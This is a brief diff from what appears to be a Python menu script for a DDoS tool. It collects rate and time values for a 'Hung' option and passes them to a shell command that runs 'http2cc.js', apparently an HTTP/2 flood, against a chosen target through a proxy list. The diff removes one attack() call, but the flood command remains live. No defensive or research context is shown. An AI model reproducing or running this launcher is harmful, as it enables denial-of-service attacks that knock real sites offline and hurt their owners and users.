@@ -451,7 +451,6 @@ def main():
             rate = input(f"""\x1b[38;2;239;239;239m┏━━[\x1b[38;2;255;99;71mrate\x1b[38;2;239;239;239m] - [\x1b[38;2;255;234;0mHung\x1b[38;2;239;239;239m]\n\x1b[38;2;239;239;239m┗━━➤ """)
             time = input(f"""\x1b[38;2;239;239;239m┏━━[\x1b[38;2;255;99;71mtime\x1b[38;2;239;239;239m] - [\x1b[38;2;255;234;0mHung\x1b[38;2;239;239;239m]\n\x1b[38;2;239;239;239m┗━━➤ """)
             os.system(f"node http2cc.js get {target} proxies.txt {time} {rate} {threads}")
-            attack()
         
             
     else:
